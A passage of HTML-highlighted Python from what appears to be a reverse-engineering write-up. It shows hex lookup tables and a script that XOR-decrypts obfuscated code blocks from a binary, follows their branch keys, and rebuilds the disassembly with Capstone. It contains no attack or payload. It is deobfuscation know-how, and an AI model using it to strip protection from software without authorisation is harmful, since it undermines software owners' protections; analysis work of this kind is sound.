class="hljs-number">0xDA83E113</span>, <span class="hljs-number">0xFFFFF998</span>, <span class="hljs-number">0x805C7ECB</span>, <span class="hljs-number">0x37EB0B72</span>, <span class="hljs-number">0xFFFFF3EC</span>, <span class="hljs-number">0x7480201A</span>, <span class="hljs-number">0xFFFFF903</span>, <span class="hljs-number">0xAC977E11</span>, <span class="hljs-number">0x389A58A8</span>, <span class="hljs-number">0x00000189</span>, <span class="hljs-number">0xE4005CD7</span>, <span class="hljs-number">0xFFFFFDEC</span>, <span class="hljs-number">0xB043695F</span>, <span class="hljs-number">0x3CB24155</span>, <span class="hljs-number">0x0000084C</span>, <span class="hljs-number">0x8ACB6FF1</span>, <span class="hljs-number">0x00000899</span>, <span class="hljs-number">0xACB471A5</span>, <span class="hljs-number">0x3DCBCDE3</span>, <span class="hljs-number">0x000007A8</span>, <span class="hljs-number">0xA84E3072</span>, <span class="hljs-number">0x00000384</span>, <span class="hljs-number">0xB2624259</span>, <span class="hljs-number">0x3F5290DE</span>, <span class="hljs-number">0xFFFFFE25</span>, <span class="hljs-number">0x8AC11F92</span>, <span class="hljs-number">0xFFFFFD8A</span>, <span class="hljs-number">0x44ACCD78</span>, <span class="hljs-number">0x47FF9B7E</span>, <span class="hljs-number">0x00000A81</span>, <span class="hljs-number">0x9833BF9C</span>, <span class="hljs-number">0x00000B35</span>, <span class="hljs-number">0x9B7199CD</span>, <span class="hljs-number">0x4C7867E6</span>, <span class="hljs-number">0x0000011C</span>, <span class="hljs-number">0x68BB4F80</span>, <span class="hljs-number">0x0000002E</span>, <span class="hljs-number">0x75B675CD</span>, <span class="hljs-number">0x53ADCD80</span>, <span class="hljs-number">0x000004E8</span>, <span class="hljs-number">0x6AA4F705</span>, <span class="hljs-number">0x00000452</span>, <span class="hljs-number">0xBA7C314B</span>, <span class="hljs-number">0x566E1640</span>, <span class="hljs-number">0x00000C8E</span>, <span class="hljs-number">0x203E3737</span>, <span class="hljs-number">0x00000C38</span>, <span class="hljs-number">0xF9367ED9</span>, <span class="hljs-number">0x5EDBB130</span>, <span class="hljs-number">0x000004FF</span>, <span class="hljs-number">0xD4F71A40</span>, <span class="hljs-number">0x000002AA</span>, <span class="hljs-number">0x35DC4141</span>, <span class="hljs-number">0x6C29C83A</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0xBEAD8A76</span>, <span class="hljs-number">0xFFFFFFB5</span>, <span class="hljs-number">0x7A8A43EF</span>, <span class="hljs-number">0x6E036C9C</span>, <span class="hljs-number">0x00000BD5</span>, <span class="hljs-number">0x225F81E0</span>, <span class="hljs-number">0x00000D89</span>, <span class="hljs-number">0x3C25944D</span>, <span class="hljs-number">0x6FDCCE50</span>, <span class="hljs-number">0x00000605</span>, <span class="hljs-number">0xD3126740</span>, <span class="hljs-number">0x000003D5</span>, <span class="hljs-number">0xA3DA544C</span>, <span class="hljs-number">0x7132D345</span>, <span class="hljs-number">0x0000064E</span>, <span class="hljs-number">0x00915A5A</span>, <span class="hljs-number">0x000006DD</span>, <span class="hljs-number">0x5BCB6B22</span>, <span class="hljs-number">0x720DBD5C</span>, <span class="hljs-number">0x000008C3</span>, <span class="hljs-number">0x64DCFDF6</span>, <span class="hljs-number">0x00000858</span>, <span class="hljs-number">0x190B20BB</span>, <span class="hljs-number">0x7A035AD4</span>, <span class="hljs-number">0x00000424</span>, <span class="hljs-number">0x4DD955FB</span>, <span class="hljs-number">0x000004BF</span>, <span class="hljs-number">0xF65150B5</span>, <span class="hljs-number">0x7CBAED22</span>, <span class="hljs-number">0x00000AA1</span>, <span class="hljs-number">0x62CC154B</span>, <span class="hljs-number">0xFFFFFC58</span>, <span class="hljs-number">0x8DD5CEDB</span>, <span class="hljs-number">0x7EBF8EA8</span>, <span class="hljs-number">0x00000458</span>, <span class="hljs-number">0xCE844A0E</span>, <span class="hljs-number">0xFFFFF734</span>, <span class="hljs-number">0x9079D6BA</span>, <span class="hljs-number">0x804885CD</span>, <span class="hljs-number">0x000007BB</span>, <span class="hljs-number">0x89A8DA66</span>, <span class="hljs-number">0x00000136</span>, <span class="hljs-number">0x7185B813</span>, <span class="hljs-number">0x82190F37</span>, <span class="hljs-number">0xFFFFF58C</span>, <span class="hljs-number">0x013FA7D4</span>, <span class="hljs-number">0xFFFFF4AB</span>, <span class="hljs-number">0x7518093D</span>, <span class="hljs-number">0x83F7826A</span>, <span class="hljs-number">0x00000917</span>, <span class="hljs-number">0x2F33C3DD</span>, <span class="hljs-number">0xFFFFFBF0</span>, <span class="hljs-number">0x02A289B1</span>, <span class="hljs-number">0x8481BFD5</span>, <span class="hljs-number">0xFFFFF927</span>, <span class="hljs-number">0x72EED2D1</span>, <span class="hljs-number">0xFFFFF80A</span>, <span class="hljs-number">0xF46FD351</span>, <span class="hljs-number">0x85A69D6E</span>, <span class="hljs-number">0x000000B4</span>, <span class="hljs-number">0x27A3BB0F</span>, <span class="hljs-number">0x00000181</span>, <span class="hljs-number">0x49235BC0</span>, <span class="hljs-number">0x85F73150</span>, <span class="hljs-number">0x00000259</span>, <span class="hljs-number">0xA300692F</span>, <span class="hljs-number">0x000009BD</span>, <span class="hljs-number">0x5A3E46A9</span>, <span class="hljs-number">0x86E2497A</span>, <span class="hljs-number">0xFFFFFB53</span>, <span class="hljs-number">0xE7614707</span>, <span class="hljs-number">0xFFFFFBB3</span>, <span class="hljs-number">0xFA190B2A</span>, <span class="hljs-number">0x8B261F60</span>, <span class="hljs-number">0xFFFFF323</span>, <span class="hljs-number">0x97B9CC33</span>, <span class="hljs-number">0xFFFFFAB7</span>, <span class="hljs-number">0x2CB73BF0</span>, <span class="hljs-number">0x8B42B00C</span>, <span class="hljs-number">0x00000871</span>, <span class="hljs-number">0xA57A2DE3</span>, <span class="hljs-number">0x00000797</span>, <span class="hljs-number">0xA73082D6</span>, <span class="hljs-number">0x8E4C5C94</span>, <span class="hljs-number">0x000000FE</span>, <span class="hljs-number">0xEE4B594B</span>, <span class="hljs-number">0xFFFFF999</span>, <span class="hljs-number">0xDCE3B74D</span>, <span class="hljs-number">0x913A9FDB</span>, <span class="hljs-number">0xFFFFFE1C</span>, <span class="hljs-number">0x1BFFA329</span>, <span class="hljs-number">0xFFFFFD31</span>, <span class="hljs-number">0x49B21C95</span>, <span class="hljs-number">0x922BFB96</span>, <span class="hljs-number">0xFFFFF61B</span>, <span class="hljs-number">0x4FAFD829</span>, <span class="hljs-number">0xFFFFFBBA</span>, <span class="hljs-number">0x6BD5D317</span>, <span class="hljs-number">0x9F4B8702</span>, <span class="hljs-number">0xFFFFFEC1</span>, <span class="hljs-number">0xB691AD49</span>, <span class="hljs-number">0xFFFFFEF2</span>, <span class="hljs-number">0xCE6C6FE9</span>, <span class="hljs-number">0xA2CEAAA6</span>, <span class="hljs-number">0xFFFFFD89</span>, <span class="hljs-number">0x60E52701</span>, <span class="hljs-number">0xFFFFFCB2</span>, <span class="hljs-number">0x25AD9A9D</span>, <span class="hljs-number">0xAA970D72</span>, <span class="hljs-number">0xFFFFF2BB</span>, <span class="hljs-number">0xC1F58CAC</span>, <span class="hljs-number">0xFFFFF2AB</span>, <span class="hljs-number">0x20B8FE22</span>, <span class="hljs-number">0xABC02B72</span>, <span class="hljs-number">0xFFFFF94B</span>, <span class="hljs-number">0xFF6EA5A6</span>, <span class="hljs-number">0xFFFFFA6A</span>, <span class="hljs-number">0x1CD46647</span>, <span class="hljs-number">0xAE535E9E</span>, <span class="hljs-number">0x000003EC</span>, <span class="hljs-number">0x31246F6B</span>, <span class="hljs-number">0x0000035B</span>, <span class="hljs-number">0x50E2A20A</span>, <span class="hljs-number">0xB7337941</span>, <span class="hljs-number">0xFFFFF856</span>, <span class="hljs-number">0xD1A79AD7</span>, <span class="hljs-number">0xFFFFF955</span>, <span class="hljs-number">0x14673B75</span>, <span class="hljs-number">0xBB8DB95E</span>, <span class="hljs-number">0xFFFFFEEB</span>, <span class="hljs-number">0x6A7F1E5A</span>, <span class="hljs-number">0xFFFFF3B3</span>, <span class="hljs-number">0x1EF2F3AA</span>, <span class="hljs-number">0xBC1EDA22</span>, <span class="hljs-number">0xFFFFFB90</span>, <span class="hljs-number">0xE247955F</span>, <span class="hljs-number">0xFFFFFCE6</span>, <span class="hljs-number">0xA0351A85</span>, <span class="hljs-number">0xBCD91FE8</span>, <span class="hljs-number">0x0000008C</span>, <span class="hljs-number">0x71A348B9</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x821754EF</span>, <span class="hljs-number">0xBD38E305</span>, <span class="hljs-number">0xFFFFFF59</span>, <span class="hljs-number">0xE694333F</span>, <span class="hljs-number">0xFFFFFEF9</span>, <span class="hljs-number">0x436B1A45</span>, <span class="hljs-number">0xBE1AA65A</span>, <span class="hljs-number">0xFFFFF93D</span>, <span class="hljs-number">0x8761A810</span>, <span class="hljs-number">0xFFFFFEEB</span>, <span class="hljs-number">0xB2DB19FA</span>, <span class="hljs-number">0xC052453C</span>, <span class="hljs-number">0x000009B5</span>, <span class="hljs-number">0xB05027D7</span>, <span class="hljs-number">0x000009C5</span>, <span class="hljs-number">0xBCA91679</span>, <span class="hljs-number">0xC4A2D780</span>, <span class="hljs-number">0x000008B9</span>, <span class="hljs-number">0xE42FD068</span>, <span class="hljs-number">0x000007C1</span>, <span class="hljs-number">0x9F8B2B83</span>, <span class="hljs-number">0xC6A236BA</span>, <span class="hljs-number">0xFFFFFDBB</span>, <span class="hljs-number">0x20649A12</span>, <span class="hljs-number">0xFFFFFD09</span>, <span class="hljs-number">0x5F73FD94</span>, <span class="hljs-number">0xC6BB5160</span>, <span class="hljs-number">0xFFFFFE90</span>, <span class="hljs-number">0x0ED42674</span>, <span class="hljs-number">0xFFFFFF4B</span>, <span class="hljs-number">0xA76699CC</span>, <span class="hljs-number">0xCB74E940</span>, <span class="hljs-number">0x000003E3</span>, <span class="hljs-number">0x7DA194FF</span>, <span class="hljs-number">0xFFFFFCDA</span>, <span class="hljs-number">0xB23E5B15</span>, <span class="hljs-number">0xD027B387</span>, <span class="hljs-number">0xFFFFF701</span>, <span class="hljs-number">0x880BCC4F</span>, <span class="hljs-number">0xFFFFF785</span>, <span class="hljs-number">0xFEA3D685</span>, <span class="hljs-number">0xD1127D6B</span>, <span class="hljs-number">0xFFFFFAC0</span>, <span class="hljs-number">0xDF3D499A</span>, <span class="hljs-number">0x00000362</span>, <span class="hljs-number">0x84B7777D</span>, <span class="hljs-number">0xD6F5F913</span>, <span class="hljs-number">0xFFFFFCCD</span>, <span class="hljs-number">0xA5D89DB8</span>, <span class="hljs-number">0xFFFFFCAB</span>, <span class="hljs-number">0xF69BAE29</span>, <span class="hljs-number">0xDD04F828</span>, <span class="hljs-number">0xFFFFF705</span>, <span class="hljs-number">0xE18F3BA0</span>, <span class="hljs-number">0xFFFFF64D</span>, <span class="hljs-number">0xEBC799B0</span>, <span class="hljs-number">0xDDF22CB8</span>, <span class="hljs-number">0x0000075D</span>, <span class="hljs-number">0x47F7B857</span>, <span class="hljs-number">0x000001B3</span>, <span class="hljs-number">0x5C1CDEA9</span>, <span class="hljs-number">0xDF34D0A8</span>, <span class="hljs-number">0x0000014D</span>, <span class="hljs-number">0xBFE2CAD5</span>, <span class="hljs-number">0x00000201</span>, <span class="hljs-number">0x1F0C8A89</span>, <span class="hljs-number">0xE146EA40</span>, <span class="hljs-number">0x0000046D</span>, <span class="hljs-number">0x189EB8F9</span>, <span class="hljs-number">0xFFFFF6FB</span>, <span class="hljs-number">0x4CA1090D</span>, <span class="hljs-number">0xE231C560</span>, <span class="hljs-number">0x00000710</span>, <span class="hljs-number">0x2E586529</span>, <span class="hljs-number">0xFFFFFF17</span>, <span class="hljs-number">0x0E9AA776</span>, <span class="hljs-number">0xE2FC6838</span>, <span class="hljs-number">0x00000733</span>, <span class="hljs-number">0xB73DDD7A</span>, <span class="hljs-number">0x00000753</span>, <span class="hljs-number">0x14A1BDE4</span>, <span class="hljs-number">0xE44AE35D</span>, <span class="hljs-number">0x000002C8</span>, <span class="hljs-number">0x46B1F3D1</span>, <span class="hljs-number">0xFFFFFA2D</span>, <span class="hljs-number">0xD2295816</span>, <span class="hljs-number">0xE5AF4AB1</span>, <span class="hljs-number">0x00000DB0</span>, <span class="hljs-number">0x0AFF4FF9</span>, <span class="hljs-number">0x00000D91</span>, <span class="hljs-number">0xB17A4340</span>, <span class="hljs-number">0xE7E3CF21</span>, <span class="hljs-number">0x00000656</span>, <span class="hljs-number">0x9FC50924</span>, <span class="hljs-number">0x00000658</span>, <span class="hljs-number">0x31615022</span>, <span class="hljs-number">0xE8815965</span>, <span class="hljs-number">0x00000BCB</span>, <span class="hljs-number">0x6F51A655</span>, <span class="hljs-number">0x00000C0A</span>, <span class="hljs-number">0x72F5680C</span>, <span class="hljs-number">0xEBDF0F14</span>, <span class="hljs-number">0xFFFFF2B1</span>, <span class="hljs-number">0xD36EC5D4</span>, <span class="hljs-number">0xFFFFF239</span>, <span class="hljs-number">0x3B711343</span>, <span class="hljs-number">0xEC12E59B</span>, <span class="hljs-number">0x00000270</span>, <span class="hljs-number">0x3A38D2E8</span>, <span class="hljs-number">0x0000023D</span>, <span class="hljs-number">0x68D07674</span>, <span class="hljs-number">0xF4013920</span>, <span class="hljs-number">0x00000703</span>, <span class="hljs-number">0xD83CCFAA</span>, <span class="hljs-number">0x000007BA</span>, <span class="hljs-number">0x46891EEB</span>, <span class="hljs-number">0xF6847EC1</span>, <span class="hljs-number">0xFFFFFE62</span>, <span class="hljs-number">0x6D4BAAFC</span>, <span class="hljs-number">0xFFFFFD92</span>, <span class="hljs-number">0x5E6F5A94</span>]<br><br><br>size_table = [<span class="hljs-number">0x02F73020</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x09D3473A</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x0EF87B55</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x147CB028</span>, <span class="hljs-number">0x00000023</span>, <span class="hljs-number">0x15F833AA</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x17086780</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x1733A9D4</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x17D61EE8</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x1D52F19E</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x1F732DE0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x1FBECFAD</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x245BD7C8</span>, <span class="hljs-number">0x00000055</span>, <span class="hljs-number">0x25E7ABEE</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x2882C190</span>, <span class="hljs-number">0x000000A2</span>, <span class="hljs-number">0x2A2084A0</span>, <span class="hljs-number">0x00000075</span>, <span class="hljs-number">0x326AA6AE</span>, <span class="hljs-number">0x00000036</span>, <span class="hljs-number">0x33074A36</span>, <span class="hljs-number">0x00000024</span>, <span class="hljs-number">0x3440BD69</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x362A1FC3</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x3C0450D0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x3CB575FD</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x41B3B26E</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x46005120</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x465A72CF</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x492145A0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x49AA4CE0</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x4BD63647</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x4BF84A87</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x4D102445</span>, <span class="hljs-number">0x00000033</span>, <span class="hljs-number">0x4D4D3C55</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x53723232</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x5809B5CB</span>, <span class="hljs-number">0x000000A2</span>, <span class="hljs-number">0x5B12FFCE</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x5B1F3000</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x5D9FBD20</span>, <span class="hljs-number">0x00000027</span>, <span class="hljs-number">0x6219EED9</span>, <span class="hljs-number">0x0000008A</span>, <span class="hljs-number">0x65D82D17</span>, <span class="hljs-number">0x0000004C</span>, <span class="hljs-number">0x67F5671A</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x6CE2CBC1</span>, <span class="hljs-number">0x00000033</span>, <span class="hljs-number">0x718A739C</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x71A62DD7</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x7693A1F6</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x7A473FB0</span>, <span class="hljs-number">0x00000047</span>, <span class="hljs-number">0x7AEFEDDC</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x7AF2CF90</span>, <span class="hljs-number">0x0000004F</span>, <span class="hljs-number">0x7BE0B8B0</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x80EB3E88</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x8213506A</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x82468114</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x86B872A2</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x87FBD296</span>, <span class="hljs-number">0x00000019</span>, <span class="hljs-number">0x88719339</span>, <span class="hljs-number">0x00000016</span>, <span class="hljs-number">0x89E2630A</span>, <span class="hljs-number">0x00000024</span>, <span class="hljs-number">0x8CB6536E</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x92316E00</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x9415A51E</span>, <span class="hljs-number">0x0000004F</span>, <span class="hljs-number">0x94D658E0</span>, <span class="hljs-number">0x0000002B</span>, <span class="hljs-number">0x97E8DFCD</span>, <span class="hljs-number">0x00000036</span>, <span class="hljs-number">0x992E3874</span>, <span class="hljs-number">0x0000002A</span>, <span class="hljs-number">0x9B06958D</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x9B36B480</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0xA03CEFAD</span>, <span class="hljs-number">0x0000005A</span>, <span class="hljs-number">0xA39F47E6</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0xA946DEC4</span>, <span class="hljs-number">0x000000B4</span>, <span class="hljs-number">0xAE6173DC</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0xB044A68D</span>, <span class="hljs-number">0x0000008C</span>, <span class="hljs-number">0xB29E36A8</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0xB82781F4</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0xC14DFAF8</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xC3F42E20</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0xC5E0065E</span>, <span class="hljs-number">0x00000067</span>, <span class="hljs-number">0xCAD68B21</span>, <span class="hljs-number">0x00000039</span>, <span class="hljs-number">0xCBF29AC7</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xCE8729BC</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0xD2A85A94</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0xD34FA4F3</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xD64611B0</span>, <span class="hljs-number">0x00000058</span>, <span class="hljs-number">0xD814FD56</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0xDD386A80</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0xDE82DFAC</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xEC68D16F</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0xEEDE845B</span>, <span class="hljs-number">0x0000003F</span>, <span class="hljs-number">0xF235F260</span>, <span class="hljs-number">0x0000008D</span>, <span class="hljs-number">0xF9AA1F0B</span>, <span class="hljs-number">0x00000087</span>, <span class="hljs-number">0xFC200887</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xFED657A3</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000000</span>]<br>zf_0_jmp = <span class="hljs-number">0</span><br>zf_0_key = <span class="hljs-number">1</span><br>zf_1_jmp = <span class="hljs-number">2</span><br>zf_1_key = <span class="hljs-number">3</span><br><br><br>code_bin = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>print(<span class="hljs-string">&quot;code size: &quot;</span>, <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(code_bin)))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_size</span>(<span class="hljs-params">key</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">85</span>):<br>        <span class="hljs-keyword">if</span> size_table[i * <span class="hljs-number">2</span>] == key:<br>            <span class="hljs-keyword">return</span>  size_table[i * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_jmps</span>(<span class="hljs-params">key</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">85</span>):<br>        base = i * <span class="hljs-number">5</span><br>        <span class="hljs-keyword">if</span> fuckTable[base] == key:<br>            <span class="hljs-comment"># zf_0_jmp, zf_0_key, zf_1_jmp, zf_1_key</span><br>            <span class="hljs-keyword">return</span> fuckTable[base + <span class="hljs-number">1</span>: base + <span class="hljs-number">5</span>]<br>    print(<span class="hljs-string">&quot;not found2: &quot;</span>, <span class="hljs-built_in">hex</span>(key))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuck</span>(<span class="hljs-params">prev_key, rip</span>):</span><br>    <span class="hljs-keyword">return</span> rip ^ prev_key ^ ((rip * prev_key) &amp; <span class="hljs-number">0xffffffff</span>) ^ (prev_key + rip)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deXor</span>(<span class="hljs-params">data, key</span>):</span><br>    key = p32(key)<br>    data = <span class="hljs-built_in">bytearray</span>(data)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        data[i] ^=  key[i % <span class="hljs-number">4</span>]<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt_block</span>(<span class="hljs-params">key, rip</span>):</span><br>    key2 = fuck(key, rip)<br>    blockSize = get_size(key2)<br><br>    <span class="hljs-keyword">if</span> blockSize <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        print(<span class="hljs-string">&quot;Not found1: rip:%x key:%x&quot;</span> % (rip, key2))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>    offset = rip - <span class="hljs-number">0x1000</span><br>    code_data = code_bin[offset: offset + blockSize]<br>    code_data = deXor(code_data, key)<br>    next_rip = rip + blockSize - <span class="hljs-number">2</span><br>    key2 = fuck(key, next_rip)<br><br>    jmps = get_jmps(key2)<br><br>    <span class="hljs-keyword">return</span> code_data, jmps, next_rip<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Node</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, data, rip</span>):</span><br>        self.code_data = data<br>        self.child1 = <span class="hljs-number">0</span><br>        self.child2 = <span class="hljs-number">0</span><br>        self.end_rip = <span class="hljs-literal">None</span><br>        self.rip = rip<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">disasm</span>(<span class="hljs-params">data, baseaddr</span>):</span><br>    md = Cs(CS_ARCH_X86, CS_MODE_64)<br>    ins = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> md.disasm(data, baseaddr):<br>        asm_code = <span class="hljs-string">&quot;%s\t%s&quot;</span> % (i.mnemonic, i.op_str)<br>        ins += asm_code + <span class="hljs-string">&quot;\n&quot;</span><br>    <span class="hljs-keyword">return</span> ins<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">buildNode</span>(<span class="hljs-params">key_, rip_</span>):</span><br>    work_queue = [(key_, rip_)]<br>    log_map = &#123;&#125;<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(work_queue) &gt; <span class="hljs-number">0</span>:<br>        T = work_queue[<span class="hljs-number">0</span>]<br>        work_queue.remove(T)<br>        key, rip = T<br><br><br>        <span class="hljs-keyword">if</span> rip <span class="hljs-keyword">in</span> log_map:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> rip == <span class="hljs-number">0x10A3</span>:<br>            key -= <span class="hljs-number">0x2B09B990</span><br>            rip = <span class="hljs-number">0x1EEC</span><br><br>        code_data, jmps, next_rip = decrypt_block(key, rip)<br><br>        <span class="hljs-keyword">if</span> code_data <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br><br>        node_cur = Node(code_data, rip)<br><br>        node_cur.end_rip = next_rip<br>        log_map[rip] = node_cur<br><br>        <span class="hljs-keyword">if</span> jmps <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br><br>        asm_text = disasm(node_cur.code_data, rip)<br><br><br>        newrip = next_rip + ctypes.c_int32(jmps[zf_0_jmp]).value<br>        node_cur.child1 = newrip<br>        <span class="hljs-keyword">if</span> newrip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> log_map:<br>            work_queue.append(((key + jmps[zf_0_key]) &amp; <span class="hljs-number">0xffffffff</span>, newrip))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;qword ptr fs:[&#x27;</span> <span class="hljs-keyword">in</span> asm_text.splitlines()[-<span class="hljs-number">1</span>]:<br>            <span class="hljs-keyword">continue</span><br><br><br>        newrip = next_rip + ctypes.c_int32(jmps[zf_1_jmp]).value<br>        node_cur.child2 = newrip<br>        <span class="hljs-keyword">if</span> newrip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> log_map:<br>            work_queue.append(((key + jmps[zf_1_key]) &amp; <span class="hljs-number">0xffffffff</span>, newrip))<br><br><br>    jmptables = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(log_map.keys()):<br>        <span class="hljs-keyword">if</span> log_map[i].child1 <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            log_map[i].child1 = <span class="hljs-number">0</span><br><br>        <span class="hljs-keyword">if</span> log_map[i].child2 <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            log_map[i].child2 = <span class="hljs-number">0</span><br><br>        jmptables[<span class="hljs-built_in">hex</span>(log_map[i].end_rip)] = (<span class="hljs-built_in">hex</span>(log_map[i].rip), <span class="hljs-built_in">hex</span>(log_map[i].child1), <span class="hljs-built_in">hex</span>(log_map[i].child2))<br>    print(<span class="hljs-string">&quot;len:&quot;</span>, <span class="hljs-built_in">len</span>(jmptables))<br>    print(jmptables)<br><br>    all_asm = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(log_map.keys()):<br>        print(<span class="hljs-built_in">hex</span>(i))<br>        node = log_map[i]<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">0x1EEC</span>:<br>            all_asm += <span class="hljs-string">&quot;_0x10a3:\n&quot;</span><br><br>        all_asm += <span class="hljs-string">&quot;_&quot;</span> + <span class="hljs-built_in">hex</span>(i) + <span class="hljs-string">&quot;:\n&quot;</span><br>        all_asm += disasm(node.code_data, i)<br>        <br>        <span class="hljs-keyword">if</span> node.child1 != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> node.child2 != <span class="hljs-number">0</span>:<br>            jmp_code = <span class="hljs-string">&quot;jz _&quot;</span> + <span class="hljs-built_in">hex</span>(node.child2) + <span class="hljs-string">&quot;\n&quot;</span><br>            jmp_code += <span class="hljs-string">&quot;jmp _&quot;</span> + <span class="hljs-built_in">hex</span>(node.child1) + <span class="hljs-string">&quot;\n&quot;</span><br><br>        <span class="hljs-keyword">elif</span> node.child1 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> node.child2 != <span class="hljs-number">0</span>:<br>            jmp_code = <span class="hljs-string">&quot;jmp _&quot;</span> + <span class="hljs-built_in">hex</span>(node.child2) + <span class="hljs-string">&quot;\n&quot;</span><br><br>        <span class="hljs-keyword">elif</span> node.child2 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> node.child1 != 